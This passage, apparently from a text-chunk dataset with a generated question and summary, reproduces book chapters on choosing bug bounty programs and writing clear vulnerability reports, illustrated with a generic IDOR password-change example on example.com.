iOS. A rooted\ndevice is one for which you have admin privileges. It will allow you to experi-\nment more freely, because you can bypass the mobile system’s safety con-\nstraints. An emulator is a virtual simulation of mobile environments that\nyou run on your computer. It allows you to run multiple device versions and\noperating systems without owning a device for each setup.\nFor these reasons, mobile applications are less popular among bug\nbounty hunters than web applications. However, the higher barrier of entry\nfor mobile programs is an advantage for those who do participate. These\nprograms are less competitive, making it relatively easy to find bugs.\nAPIs\nApplication programming interfaces (APIs) are specifications that define how\nother applications can interact with an organization’s assets, such as to\nretrieve or alter their data. For example, another application might be able\n6 Chapter 1\nto retrieve an application’s data via HyperText Transfer Protocol (HTTP)\nmessages to a certain endpoint, and the application will return data in\nthe format of Extensible Markup Language (XML) or JavaScript Object\nNotation (JSON) messages.\nSome programs put a heightened focus on API bugs in their bug bounty\nprograms if they’re rolling out a new version of their API. A secure API\nimplementation is key to preventing data breaches and protecting customer\ndata. Hacking APIs requires many of the same skills as hacking web applica-\ntions, mobile applications, and IoT applications. But when testing APIs, you\nshould focus on common API bugs like data leaks and injection flaws.\nSource Code and Executables\nIf you have more advanced programming and reversing skills, you can give\nsource code and executable programs a try. These programs encourage hackers\nto find vulnerabilities in an organization’s software by directly providing\nhackers with an open source codebase or the binary executable. Examples\ninclude the Internet Bug Bounty, the program for the PHP language, and\nthe WordPress program.\nHacking these programs can entail analyzing the source code of open\nsource projects for web vulnerabilities and fuzzing binaries for potential\nexploits. You usually have to understand coding and computer science con-\ncepts to be successful here. You’ll need knowledge of web vulnerabilities,\nprogramming skills related to the project’s codebase, and code analysis\nskills. Cryptography, software development, and reverse engineering skills\nare helpful.\nSource code programs may sound intimidating, but keep in mind that\nthey’re diverse, so you have many to choose from. You don’t have to be a\nmaster programmer to hack these programs; rather, aim for a solid under-\nstanding of the project’s tech stack and underlying architecture. Because\nthese programs tend to require more skills, they are less competitive, and\nonly a small proportion of hackers will ever attempt them.\nHardware and IoT\nLast but not least are hardware and IoT programs. These programs ask you to\nhack devices like cars, smart televisions, and thermostats. Examples include\nthe bug bounty programs of Tesla and Ford Motor Company.\nYou’ll need highly specific skills to hack these programs: you’ll often\nhave to acquire a deep familiarity with the type of device that you’re hack-\ning, in addition to understanding common IoT vulnerabilities. You should\nknow about web vulnerabilities, programming, code analysis, and reverse\nengineering. Also, study up on IoT concepts and industry standards such as\ndigital signing and asymmetric encryption schemes. Finally, cryptography,\nwireless hacking, and software development skills will be helpful too.\nAlthough some programs will provide you with a free device to hack,\nthat often applies to only the select hackers who’ve already established a\nrelationship with the company. To begin hacking on these programs, you\nmight need the funds to acquire the device on your own.\nPicking a Bug Bounty Program 7\nSince these programs require specialized skills and a device, they tend\nto be the least competitive.\nBug Bounty Platforms\nCompanies can host bug bounty programs in two ways: bug bounty platforms\nand independently hosted websites.\nBug bounty platforms are websites through which many companies host\ntheir programs. Usually, the platform directly awards hackers with reputa-\ntion points and money for their results. Some of the largest bug bounty\nplatforms are HackerOne, Bugcrowd, Intigriti, Synack, and Cobalt.\nBug bounty platforms are an intermediary between hackers and secu-\nrity teams. They provide companies with logistical assistance for tasks like\npayment and communication. They also often offer help managing the\nincoming reports by filtering, deduplicating, and triaging bug reports for\ncompanies. Finally, these platforms provide a way for companies to gauge\na hacker’s skill level via hacker statistics and reputation. This allows com-\npanies that do not wish to be inundated with low-quality reports to invite\nexperienced hackers to their private programs. Some of these platforms\nalso screen or interview hackers before allowing them to hack on programs.\nFrom the hacker’s perspective, bug bounty platforms provide a central-\nized place to submit reports. They also offer a seamless way to get recognized\nand paid for your findings.\nOn the other hand, many organizations host and manage their bug\nbounty programs without the help of platforms. Companies like Google,\nFacebook, Apple, and Medium do this. You can find their bug bounty policy\npages by visiting their websites, or by searching “CompanyName bug bounty\nprogram” online.\nAs a bug bounty hunter, should you hack on a bug bounty platform? Or\nshould you go for companies’ independently hosted programs?\nThe Pros . . .\nThe best thing about bug bounty platforms is that they provide a lot of\ntransparency into a company’s process, because they post disclosed reports,\nmetrics about the programs’ triage rates, payout amounts, and response\ntimes. Independently hosted programs often lack this type of transparency.\nIn the bug bounty world, triage refers to the confirmation of vulnerability.\nYou also won’t have to worry about the logistics of emailing security\nteams, following up on reports, and providing payment and tax info every\ntime you submit a vulnerability report. Bug bounty programs also often\nhave reputation systems that allow you to showcase your experience so you\ncan gain access to invite-only bug bounty programs.\nAnother pro of bug bounty platforms is that they often step in to provide\nconflict resolution and legal protection as a third party. If you submit a report\nto a non-platform program, you have no recourse in the final bounty decision.\n8 Chapter 1\nUltimately, you can’t always expect companies to pay up or resolve reports in\nthe current state of the industry, but the hacker-to-hacker feedback system\nthat platforms provide is helpful.\n. . . and the Cons\nHowever, some hackers avoid bug bounty platforms because they dislike\nhow those platforms deal with reports. Reports submitted to platform-\nmanaged bug bounty programs often get handled by triagers, third-party\nemployees who often aren’t familiar with all the security details about a\ncompany’s product. Complaints about triagers handling reports improperly\nare common.\nPrograms on platforms also break the direct connection between\nhackers and developers. With a direct program, you often get to discuss\nthe vulnerability with a company’s security engineers, making for a great\nlearning experience.\nFinally, public programs on bug bounty platforms are often crowded,\nbecause the platform gives them extra exposure. On the other hand, many\nprivately hosted programs don’t get as much attention from hackers and\nare thus less competitive. And for the many companies that do not contract\nwith bug bounty platforms, you have no choice but to go off platforms if\nyou want to participate in their programs.\nScope, Payouts, and Response Times\nWhat other metrics should you consider when picking a program, besides\nits asset types and platform? On each bug bounty program’s page, metrics\nare often listed to help you assess the program. These metrics give insight\ninto how easily you might be able to find bugs, how much you might get\npaid, and how well the program operates.\nProgram Scope\nFirst, consider the scope. A program’s scope on its policy pages specifies what\nand how you are allowed to hack. There are two types of scopes: asset and\nvulnerability. The asset scope tells you which subdomain, products, and appli-\ncations you can hack. And the vulnerability scope specifies which vulnerabili-\nties the company will accept as valid bugs.\nFor example, the company might list the subdomains of its website that\nare in and out of scope:\nIn-scope assets Out-of-scope assets\na.example.com dev.example.com\nb.example.com test.example.com\nc.example.com\nusers.example.com\nlanding.example.com\nPicking a Bug Bounty Program 9\nAssets that are listed as in scope are the ones that you are allowed to\nhack. On the other hand, assets that are listed as out of scope are off-limits\nto bug bounty hunters. Be extra careful and abide by the rules! Hacking an\nout-of-scope asset is illegal.\nThe company will also often list the vulnerabilities it considers valid bugs:\nIn-scope vulnerabilities Out-of-scope vulnerabilities\nAll except the ones Self-XSS\nlisted as out of scope Clickjacking\nMissing HTTP headers and other best\npractices without direct security impact\nDenial-of-service attacks\nUse of known-vulnerable libraries, with-\nout proof of exploitability\nResults of automated scanners, without\nproof of exploitability\nThe out-of-scope vulnerabilities that you see in this example are typical\nof what you would find in bug bounty programs. Notice that many programs\nconsider non-exploitable issues, like violations of best practice, to be out of\nscope.\nAny program with large asset and vulnerability scopes is a good place to\nstart for a beginner. The larger the asset scope, the larger the number of tar-\nget applications and web pages you can look at. When a program has a big\nasset scope, you can often find obscure applications that are overlooked by\nother hackers. This typically means less competition when reporting bugs.\nThe larger the vulnerability scope, the more types of bugs the organi-\nzation is willing to hear reports about. These programs are a lot easier to\nfind bugs in, because you have more opportunities, and so can play to your\nstrengths.\nPayout Amounts\nThe next metric you should consider is the program’s payout amounts. There\nare two types of payment programs: vulnerability disclosure programs (VDPs)\nand bug bounty programs.\nVDPs are reputation-only programs, meaning they do not pay for find-\nings but often offer rewards such as reputation points and swag. They are\na great way to learn about hacking if making money is not your primary\nobjective. Since they don’t pay, they’re less competitive, and so easier to\nfind bugs in. You can use them to practice finding common vulnerabilities\nand communicating with security engineers.\nOn the other hand, bug bounty programs offer varying amounts of mon-\netary rewards for your findings. In general, the more severe the vulnerability,\nthe more the report will pay. But different programs have different payout\naverages for each level of severity. You can find a program’s payout infor-\nmation on its bug bounty pages, usually listed in a section called the payout\n10 Chapter 1\ntable. Typically, low-impact issues will pay anywhere from $50 to $500 (USD),\nwhile critical issues can pay upward of $10,000. However, the bug bounty\nindustry is evolving, and payout amounts are increasing for high-impact\nbugs. For example, Apple now rewards up to $1 million for the most severe\nvulnerabilities.\nResponse Time\nFinally, consider the program’s average response time. Some companies will\nhandle and resolve your reports within a few days, while others take weeks\nor even months to finalize their fixes. Delays often happen because of\nthe security team’s internal constraints, like a lack of personnel to handle\nreports, a delay in issuing security patches, and a lack of funds to timely\nreward researchers. Sometimes, delays happen because researchers have\nsent bad reports without clear reproduction steps.\nPrioritize programs with fast response times. Waiting for responses\nfrom companies can be a frustrating experience, and when you first start,\nyou’re going to make a lot of mistakes. You might misjudge the severity\nof a bug, write an unclear explanation, or make technical mistakes in the\nreport. Rapid feedback from security teams will help you improve, and turn\nyou into a competent hacker faster.\nPrivate Programs\nMost bug bounty platforms distinguish between public and private programs.\nPublic programs are those that are open to all; anyone can hack and sub-\nmit bugs to these programs, as long as they abide by the laws and the bug\nbounty program’s policies.\nOn the other hand, private programs are open to only invited hackers.\nFor these, companies ask hackers with a certain level of experience and a\nproven track record to attack the company and submit bugs to it. Private\nprograms are a lot less competitive than public ones because of the limited\nnumber of hackers participating. Therefore, it’s much easier to find bugs\nin them. Private programs also often have a much faster response time,\nbecause they receive fewer reports on average.\nParticipating in private programs can be extremely advantageous. But\nhow do you get invited to one? Figure 1-1 shows a private invitation notifica-\ntion on the HackerOne platform.\nFigure 1-1: A private invitation notification on the HackerOne platform. When you hack\non a bug bounty platform, you can often get invites to the private programs of different\ncompanies.\nCompanies send private invites to hackers who have proven their abili-\nties in some way, so getting invites to private programs isn’t difficult once\nPicking a Bug Bounty Program 11\nyou’ve found a couple of bugs. Different bug bounty platforms will have dif-\nferent algorithms to determine who gets the invites, but here are some tips\nto help you get there.\nFirst, submit a few bugs to public programs. To get private invites, you\noften need to gain a certain number of reputation points on a platform,\nand the only way to begin earning these is to submit valid bugs to public\nprograms. You should also focus on submitting high-impact vulnerabilities.\nThese vulnerabilities will often reward you with higher reputation points\nand help you get private invites faster. In each of the chapters in Part II of\nthis book, I make suggestions for how you can escalate the issues you dis-\ncover to craft the highest-impact attacks. On some bug bounty platforms,\nlike HackerOne, you can also get private invites by completing tutorials or\nsolving Capture the Flag (CTF) challenges.\nNext, don’t spam. Submitting nonissues often causes a decrease in repu-\ntation points. Most bug bounty platforms limit private invites to hackers\nwith points above a certain threshold.\nFinally, be polite and courteous when communicating with security\nteams. Being rude or abusive to security teams will probably get you banned\nfrom the program and prevent you from getting private invites from other\ncompanies.\nChoosing the Right Program\nBug bounties are a great way to gain experience in cybersecurity and earn\nextra bucks. But the industry has been getting more competitive. As more\npeople are discovering these programs and getting involved in hacking\non them, it’s becoming increasingly difficult for beginners to get started.\nThat’s why it’s important to pick a program that you can succeed in from\nthe very start.\nBefore you develop a bug hunter’s intuition, you often have to rely on\nlow-hanging fruit and well-known techniques. This means many other\nhackers will be able to find the same bugs, often much faster than you can.\nIt’s therefore a good idea to pick a program that more experienced bug\nhunters pass over to avoid competition. You can find these underpopulated\nprograms in two ways: look for unpaid programs or go for programs with\nbig scopes.\nTry going for vulnerability disclosure programs first. Unpaid programs\nare often ignored by experienced bug hunters, since they don’t pay monetary\nrewards. But they still earn you points and recognition! And that recogni-\ntion might be just what you need to get an invite to a private, paid program.\nPicking a program with a large scope means you’ll be able to look at a\nlarger number of target applications and web pages. This dilutes the com-\npetition, as fewer hackers will report on any single asset or vulnerability\ntype. Go for programs with fast response times to prevent frustration and\nget feedback as soon as possible.\nOne last thing that you can incorporate into your decision process\nis the reputation of the program. If you can, gather information about a\n12 Chapter 1\ncompany’s process through its disclosed reports and learn from other\nhackers’ experiences. Does the company treat its reporters well? Are they\nrespectful and supportive? Do they help you learn? Pick programs that will\nbe supportive while you are still learning, and programs that will reward\nyou for the value that you provide.\nChoosing the right program for your skill set is crucial if you want to\nbreak into the world of bug bounties. This chapter should have helped\nyou sort out the various programs that you might be interested in. Happy\nhacking!\nA Quick Comparison of Popular Programs\nAfter you’ve identified a few programs that you are interested in, you could\nlist the properties of each one to compare them. In Table 1-1, let’s compare\na few of the popular programs introduced in this chapter.\nTable 1-1: A Comparison of Three Bug Bounty Programs: HackerOne, Facebook, and GitHub\nProgram Asset type In scope Payout amount Response time\nHackerOne Social site https://hackerone.com/ $500–$15,000+ Fast . Average time\nhttps://api.hackerone.com to response is 5\n*.vpn.hackerone.net hours . Average\nhttps://www.hackerone.com time to triage is 15\nAnd more assets  .  .  . hours .\nAny vulnerability except\nexclusions are in scope .\nFacebook Social site, Instagram $500 minimum Based on my expe-\nnonsocial Internet .org / Free Basics rience, pretty fast!\nsite, mobile Oculus\nsite, IoT, and Workplace\nsource code Open source projects by\nFacebook\nWhatsApp\nPortal\nFBLite\nExpress Wi-Fi\nAny vulnerability except\nexclusions are in scope .\nGitHub Social site https://blog.github.com/ $617–$30,000 Fast . Average time\nhttps://community.github.com/ to response is 11\nhttp://resources.github.com/ hours . Average\nAnd more assets  .  .  . time to triage is 23\nUse of known-vulnerable hours .\nsoftware .\nClickjacking a static site .\nIncluding HTML in Markdown\ncontent .\nLeaking email addresses via\n.patch links .\nAnd more issues  .  .  .\nPicking a Bug Bounty Program 13",
    "question": "What factors should a bug bounty hunter consider when choosing the right bug bounty program to target?",
    "summary": "Bug bounty programs vary in their focus, such as social sites, general web apps, mobile apps, APIs, source code, and hardware. Choosing the right program depends on your skills, experience, and the type of vulnerabilities you're interested in. Programs with larger scopes and faster response times are often better for beginners as they offer more opportunities and less competition. Additionally, considering the program's reputation and whether it's public or private can help you decide which one is best for your goals."
  },
  {
    "start": 18,
    "end": 29,
    "text": "2\nSUSTAINING YOUR SUCCESS\nEven if you understand the technical infor-\nmation in this book, you may have difficulty\nnavigating the nuances of bug bounty pro-\ngrams. Or you might be struggling to actually\nlocate legitimate bugs and aren’t sure why you’re stuck.\nIn this chapter, we’ll explore some of the factors that\ngo into making a successful bug bounty hunter. We’ll\ncover how to write a report that properly describes\nyour findings to the security team, build lasting rela-\ntionships with the organizations you work with, and\novercome obstacles during your search for bugs.\nWriting a Good Report\nA bug bounty hunter’s job isn’t just finding vulnerabilities; it’s also explaining\nthem to the organization’s security team. If you provide a well-written report,\nyou’ll help the team you’re working with reproduce the exploit, assign it to\nthe appropriate internal engineering team, and fix the issue faster. The faster\na vulnerability is fixed, the less likely malicious hackers are to exploit it. In\nthis section, I’ll break down the components of a good vulnerability report\nand introduce some tips and tricks I’ve learned along the way.\nStep 1: Craft a Descriptive Title\nThe first part of a great vulnerability report is always a descriptive title. Aim\nfor a title that sums up the issue in one sentence. Ideally, it should allow the\nsecurity team to immediately get an idea of what the vulnerability is, where it\noccurred, and its potential severity. To do so, it should answer the following\nquestions: What is the vulnerability you’ve found? Is it an instance of a well-\nknown vulnerability type, such as IDOR or XSS? Where did you find it on\nthe target application?\nFor example, instead of a report title like “IDOR on a Critical Endpoint,”\nuse one like “IDOR on https://example.com/change_password Leads to Account\nTakeover for All Users.” Your goal is to give the security engineer reading\nyour report a good idea of the content you’ll discuss in the rest of it.\nStep 2: Provide a Clear Summary\nNext, provide a report summary. This section includes all the relevant details\nyou weren’t able to communicate in the title, like the HTTP request param-\neters used for the attack, how you found it, and so on.\nHere’s an example of an effective report summary:\nThe https://example.com/change_password endpoint takes two POST\nbody parameters: user_id and new_password. A POST request\nto this endpoint would change the password of user user_id to\nnew_password. This endpoint is not validating the user_id param-\neter, and as a result, any user can change anyone else’s password\nby manipulating the user_id parameter.\nA good report summary is clear and concise. It contains all the informa-\ntion needed to understand a vulnerability, including what the bug is, where\nthe bug is found, and what an attacker can do when it’s exploited.\nStep 3: Include a Severity Assessment\nYour report should also include an honest assessment of the bug’s severity.\nIn addition to working with you to fix vulnerabilities, security teams have\nother responsibilities to tend to. Including a severity assessment will help\nthem prioritize which vulnerabilities to fix first, and ensure that they take\ncare of critical vulnerabilities right away.\n16 Chapter 2\nYou could use the following scale to communicate severity:\nLow severity\nThe bug doesn’t have the potential to cause a lot of damage. For example,\nan open redirect that can be used only for phishing is a low-severity bug.\nMedium severity\nThe bug impacts users or the organization in a moderate way, or is a\nhigh-severity issue that’s difficult for a malicious hacker to exploit. The\nsecurity team should focus on high- and critical-severity bugs first. For\nexample, a cross-site request forgery (CSRF) on a sensitive action such\nas password change is often considered a medium-severity issue.\nHigh severity\nThe bug impacts a large number of users, and its consequences can be\ndisastrous for these users. The security team should fix a high-security\nbug as soon as possible. For example, an open redirect that can be used\nto steal OAuth tokens is a high-severity bug.\nCritical severity\nThe bug impacts a majority of the user base or endangers the organiza-\ntion’s core infrastructure. The security team should fix a critical-severity\nbug right away. For example, a SQL injection leading to remote code\nexecution (RCE) on the production server will be considered a critical\nissue.\nStudy the Common Vulnerability Scoring System (CVSS) at https://www.first.org/\ncvss/ for a general idea of how critical each type of vulnerability is. The\nCVSS scale takes into account factors such as how a vulnerability impacts an\norganization, how hard the vulnerability is to exploit, and whether the vul-\nnerability requires any special privileges or user interaction to exploit.\nThen, try to imagine what your client company cares about, and which\nvulnerabilities would present the biggest business impact. Customize your\nassessment to fit the client’s business priorities. For example, a dating site\nmight find a bug that exposes a user’s birth date as inconsequential, since\na user’s age is already public information on the site, while a job search site\nmight find a similar bug significant, because an applicant’s age should be\nconfidential in the job search process. On the other hand, leaks of users’\nbanking information are almost always considered a high-severity issue.\nIf you’re unsure which severity rating your bug falls into, use the rat-\ning scale of a bug bounty platform. For example, Bugcrowd’s rating system\ntakes into account the type of vulnerability and the affected functionality\n(https://bugcrowd.com/vulnerability-rating-taxonomy/), and HackerOne pro-\nvides a severity calculator based on the CVSS scale (https://docs.hackerone\n.com/hackers/severity.html).\nYou could list the severity in a single line, as follows:\nSeverity of the issue: High\nSustaining Your Success 17\nProviding an accurate assessment of severity will make everyone’s lives\neasier and contribute to a positive relationship between you and the secu-\nrity team.\nStep 4: Give Clear Steps to Reproduce\nNext, provide step-by-step instructions for reproducing the vulnerability.\nInclude all relevant setup prerequisites and details you can think of. It’s best\nto assume the engineer on the other side has no knowledge of the vulner-\nability and doesn’t know how the application works.\nFor example, a merely okay report might include the following steps to\nreproduce:\n1. Log in to the site and visit https://example.com/change_password.\n2. Click the Change Password button.\n3. Intercept the request, and change the user_id parameter to another\nuser’s ID.\nNotice that these steps aren’t comprehensive or explicit. They don’t\nspecify that you need two test accounts to test for the vulnerability. They\nalso assume that you have enough knowledge about the application and the\nformat of its requests to carry out each step without more instructions.\nNow, here is an example from a better report:\n1. Make two accounts on example.com: account A and account B.\n2. Log in to example.com as account A, and visit https://example.com/\nchange_password.\n3. Fill in the desired new password in the New password field, located at\nthe top left of the page.\n4. Click the Change Password button located at the top right of the page.\n5. Intercept the POST request to https://example.com/change_password and\nchange the user_id POST parameter to the user ID of account B.\n6. You can now log in to account B by using the new password you’ve\nchosen.\nAlthough the security team will probably still understand the first\nreport, the second report is a lot more specific. By providing many relevant\ndetails, you can avoid any misunderstanding and speed up the mitigation\nprocess.\nStep 5: Provide a Proof of Concept\nFor simple vulnerabilities, the steps you provide might be all that the security\nteam needs to reproduce the issue. But for more complex vulnerabilities, it’s\nhelpful to include a video, screenshots, or photos documenting your exploit,\ncalled a proof-of-concept (POC) file.\n18 Chapter 2\nFor example, for a CSRF vulnerability, you could include an HTML file\nwith the CSRF payload embedded. This way, all the security team needs to\ndo to reproduce the issue is to open the HTML file in their browser. For an\nXML external entity attack, include the crafted XML file that you used to\nexecute the attack. And for vulnerabilities that require multiple complicated\nsteps to reproduce, you could film a screen-capture video of you walking\nthrough the process.\nPOC files like these save the security team time because they won’t have\nto prepare the attack payload themselves. You can also include any crafted\nURLs, scripts, or upload files you used to attack the application.\nStep 6: Describe the Impact and Attack Scenarios\nTo help the security team fully understand the potential impact of the vulner-\nability, you can also illustrate a plausible scenario in which the vulnerability\ncould be exploited. Note that this section is not the same as the severity assess-\nment I mentioned earlier. The severity assessment describes the severity of the\nconsequences of an attacker exploiting the vulnerability, whereas the attack\nscenario explains what those consequences would actually look like.\nIf hackers exploited this bug, could they take over user accounts? Or\ncould they steal user information and cause large-scale data leaks? Put\nyourself in a malicious hacker’s shoes and try to escalate the impact of the\nvulnerability as much as possible. Give the client company a realistic sense\nof the worst-case scenario. This will help the company prioritize the fix\ninternally and determine if any additional steps or internal investigations\nare necessary.\nHere is an example of an impact section:\nUsing this vulnerability, all that an attacker needs in order to\nchange a user’s password is their user_id. Since each user’s public\nprofile page lists the account’s user_id, anyone can visit any user’s\nprofile, find out their user_id, and change their password. And\nbecause user_ids are simply sequential numbers, a hacker can\neven enumerate all the user_ids and change the passwords of all\nusers! This bug will let attackers take over anyone’s account with\nminimal effort.\nA good impact section illustrates how an attacker can realistically exploit\na bug. It takes into account any mitigating factors as well as the maximum\nimpact that can be achieved. It should never overstate a bug’s impact or\ninclude any hypotheticals.\nStep 7: Recommend Possible Mitigations\nYou can also recommend possible steps the security team can take to mitigate\nthe vulnerability. This will save the team time when it begins researching\nmitigations. Often, since you’re the security researcher who discovered the\nvulnerability, you’ll be familiar with the particular behavior of that application\nfeature, and thus in a good position to come up with a comprehensive fix.\nSustaining Your Success 19\nHowever, don’t propose fixes unless you have a good understanding of\nthe root cause of the issue. Internal teams may have much more context\nand expertise to provide appropriate mitigation strategies applicable to\ntheir environment. If you’re not sure what caused the vulnerability or what\na possible fix might be, avoid giving any recommendations so you don’t con-\nfuse your reader.\nHere is a possible mitigation you could propose:\nThe application should validate the user’s user_id parameter\nwithin the change password request to ensure that the user\nis authorized to make account modifications. Unauthorized\nrequests should be rejected and logged by the application.\nYou don’t have to go into the technical details of the fix, since you\ndon’t have knowledge of the application’s underlying codebase. But as\nsomeone who understands the vulnerability class, you can provide a\ndirection for mitigation.\nStep 8: Validate the Report\nFinally, always validate your report. Go through your report one last time\nto make sure that there are no technical errors, or anything that might\nprevent the security team from understanding it. Follow your own Steps to\nReproduce to ensure that they contain enough details. Examine all of your\nPOC files and code to make sure they work. By validating your reports, you\ncan minimize the possibility of submitting an invalid report.\nAdditional Tips for Writing Better Reports\nHere are additional tips to help you deliver the best reports possible.\nDon’t Assume Anything\nFirst, don’t assume that the security team will be able to understand every-\nthing in your report. Remember that you might have been working with\nthis vulnerability for a week, but to the security team receiving the report,\nit’s all new information. They have a whole host of other responsibilities on\ntheir plates and often aren’t as familiar with the feature as you. Additionally,\nreports are not always assigned to security teams. Newer programs, open\nsource projects, and startups may depend on developers or technical sup-\nport personnel to handle bug reports instead of having a dedicated security\nteam. Help them understand what you’ve discovered.\nBe as verbose as possible, and include all the relevant details you can\nthink of. It’s also good to include links to references explaining obscure\nsecurity knowledge that the security team might not be familiar with. Think\nabout the potential consequences of being verbose versus the consequences\nof leaving out essential details. The worst thing that can happen if you’re too\nwordy is that your report will take two extra minutes to read. But if you leave\nout important details, the remediation of the vulnerability might get delayed,\nand a malicious hacker might exploit the bug.\n20 Chapter 2\nBe Clear and Concise\nOn the other hand, don’t include any unnecessary information, such as\nwordy greetings, jokes, or memes. A security report is a business document,\nnot a letter to your friend. It should be straightforward and to the point.\nMake your report as short as possible without omitting the key details. You\nshould always be trying to save the security team’s time so they can get to\nremediating the vulnerability right away.\nWrite What You Want to Read\nAlways put your reader in mind when writing, and try to build a good reading\nexperience for them. Write in a conversational tone and don’t use leetspeak,\nslang, or abbreviations. These make the text harder to read and will add to\nyour reader’s annoyance.\nBe Professional\nFinally, always communicate with the security team with respect and profession-\nalism. Provide clarifications regarding the report patiently and promptly.\nYou’ll probably make mistakes when writing reports, and miscommuni-\ncation will inevitably happen. But remember that as the security researcher,\nyou have the power to minimize that possibility by putting time and care\ninto your writing. By honing your reporting skills in addition to your hack-\ning skills, you can save everyone’s time and maximize your value as a hacker.\nBuilding a Relationship with the Development Team\nYour job as a hacker doesn’t stop the moment you submit the report. As the\nperson who discovered the vulnerability, you should help the company fix\nthe issue and make sure the vulnerability is fully patched.\nLet’s talk about how to handle your interactions with the security team\nafter the report submission, and how to build strong relationships with\nthem. Building a strong relationship with the security team will help get\nyour reports resolved more quickly and smoothly. It might even lead to big-\nger bug bounty payouts if you can consistently contribute to the security of\nthe organization. Some bug bounty hunters have even gotten interviews or\njob offers from top tech firms because of their bug bounty findings! We’ll\ngo over the different states of your report, what you should do during each\nstage of the mitigation process, and how to handle conflicts when commu-\nnicating with the security team.\nUnderstanding Report States\nOnce you’ve submitted your report, the security team will classify it into a\nreport state, which describes the current status of your report. The report\nstate will change as the process of mitigation moves forward. You can find\nthe report state listed on the bug bounty platform’s interface, or in the mes-\nsages you receive from security teams.\nSustaining Your Success 21\nNeed More Information\nOne of the most common report states you’ll see is need more information. This\nmeans the security team didn’t fully understand your report, or couldn’t\nreproduce the issue by using the information you’ve provided. The security\nteam will usually follow up with questions or requests for additional informa-\ntion about the vulnerability.\nIn this case, you should revise your report, provide any missing infor-\nmation, and address the security team’s additional concerns.\nInformative\nIf the security team marks your report as informative, they won’t fix the bug.\nThis means they believe the issue you reported is a security concern but\nnot significant enough to warrant a fix. Vulnerabilities that do not impact\nother users, such as the ability to increase your own scores on an online\ngame, often fall into this category. Another type of bug often marked as\ninformative is a missing security best practice, like allowing users to reuse\npasswords.\nIn this case, there’s nothing more you can do for the report! The company\nwon’t pay you a bounty, and you don’t have to follow up, unless you believe the\nsecurity team made a mistake. However, I do recommend that you keep track\nof informative issues and try to chain them into bigger, more impactful bugs.\nDuplicate\nA duplicate report status means another hacker has already found the bug,\nand the company is in the process of remediating the vulnerability.\nUnfortunately, since companies award bug bounties to only the first\nhacker who finds the bug, you won’t get paid for duplicates. There’s nothing\nmore to do with the report besides helping the company resolve the issue. You\ncan also try to escalate or chain the bug into a more impactful bug. That way,\nthe security team might see the new report as a separate issue and reward you.\nN/A\nA not applicable (N/A) status means your report doesn’t contain a valid secu-\nrity issue with security implications. This might happen when your report\ncontains technical errors, or if the bug is intentional application behavior.\nN/A reports don’t pay. There is nothing more for you to do here besides\nmove on and continue hacking!\nTriaged\nSecurity teams triage a report when they’ve validated the report on their\nend. This is great news for you, because this usually means the security\nteam is going to fix the bug and reward you with a bounty.\nOnce the report has been triaged, you should help the security team fix\nthe issue. Follow up with their questions promptly, and provide any additional\ninformation they ask for.\n22 Chapter 2\nResolved\nWhen your report is marked as resolved, the reported vulnerability has been\nfixed. At this point, pat yourself on the back and rejoice in the fact that\nyou’ve made the internet a little safer. If you are participating in a paid bug\nbounty program, you can also expect to receive your payment at this point!\nThere’s nothing more to do with the report besides celebrate and con-\ntinue hacking.\nDealing with Conflict\nNot all reports can be resolved quickly and smoothly. Conflicts inevitably\nhappen when the hacker and the security team disagree on the validity of\nthe bug, the severity of the bug, or the appropriate payout amount. Even so,\nconflicts could ruin your reputation as a hacker, so handling them profes-\nsionally is key to a successful bug hunting career. Here’s what you should do\nif you find yourself in conflict with the security team.\nWhen you disagree with the security team about the validity of the bug,\nfirst make sure that all the information in your initial report is correct. Often,\nsecurity teams mark reports as informative or N/A because of a technical or\nwriting mistake. For example, if you included incorrect URLs in your POC,\nthe security team might not be able to reproduce the issue. If this caused the\ndisagreement, send over a follow-up report with the correct information as\nsoon as possible.\nOn the other hand, if you didn’t make a mistake in your report but still\nbelieve they’ve labeled the issue incorrectly, send a follow-up explaining\nwhy you believe that the bug is a security issue. If that still doesn’t resolve\nthe misunderstanding, you can ask for mediation by the bug bounty plat-\nform or other security engineers on the team.\nMost of the time, it is difficult for others to see the impact of a vulner-\nability if it doesn’t belong to a well-known bug class. If the security team\ndismisses the severity of the reported issue, you should explain some\npotential attack scenarios to fully illustrate its impact.\nFinally, if you’re unhappy with the bounty amount, communicate that\nwithout resentment. Ask for the organization’s reasoning behind assigning\nthat bounty, and explain why you think you deserve a higher reward. For\nexample, if the person in charge of your report underestimated the severity\nof the bug, you can elaborate on the impact of the issue when you ask for a\nhigher reward. Whatever you do, always avoid asking for more money with-\nout explanation.\nRemember, we all make mistakes. If you believe the person handling your\nreport mishandled the issue, ask for reconsideration courteously. Once you’ve\nmade your case, respect the company’s final decision about the fix and bounty\namount.\nBuilding a Partnership\nThe bug bounty journey doesn’t stop after you’ve resolved a report. You\nshould strive to form long-term partnerships with organizations. This can\nSustaining Your Success 23\nhelp get your reports resolved more smoothly and might even land you an\ninterview or job offer. You can form good relationships with companies by\nrespecting their time and communicating with professionalism.\nFirst, gain respect by always submitting validated reports. Don’t break\na company’s trust by spamming, pestering them for money, or verbally\nabusing the security team. In turn, they’ll respect you and prioritize you\nas a researcher. Companies often ban hunters who are disrespectful or\nunreasonable, so avoid falling into those categories at all costs.\nAlso learn the communication style of each organization you work with.\nHow much detail do they expect in their reports? You can learn about a secu-\nrity team’s communication style by reading their publicly disclosed reports, or\nby incorporating their feedback about your reports into future messages. Do\nthey expect lots of photos and videos to document the bug? Customize your\nreports to make your reader’s job easier.\nFinally, make sure you support the security team until they resolve the\nissue. Many organizations will pay you a bounty upon report triage, but please\ndon’t bail on the security team after you receive the reward! If it’s requested,\nprovide advice to help mitigate the vulnerability, and help security teams\nconfirm that the issue has been fixed. Sometimes organizations will ask you to\nperform retests for a fee. Always take that opportunity if you can. You’ll not only\nmake money, but also help companies resolve the issue faster.\nUnderstanding Why You’re Failing\nYou’ve poured hours into looking for vulnerabilities and haven’t found a\nsingle one. Or you keep submitting reports that get marked informative,\nN/A, or duplicate.\nYou’ve followed all the rules. You’ve used all the tools. What’s going\nwrong? What secrets are the leaderboard hackers hiding from you? In this\nsection, I’ll discuss the mistakes that prevent you from succeeding in bug\nbounties, and how you can improve.\nWhy You’re Not Finding Bugs\nIf you spend a lot of time in bug bounties and still have trouble finding\nbugs, here are some possible reasons.\nYou Participate in the Wrong Programs\nYou might have been targeting the wrong programs all along. Bug bounty\nprograms aren’t created equally, and picking the right one is essential. Some\nprograms delay fixing bugs because they lack the resources to deal with\nreports. Some programs downplay the severity of vulnerabilities to avoid\npaying hackers. Finally, other programs restrict their scope to a small 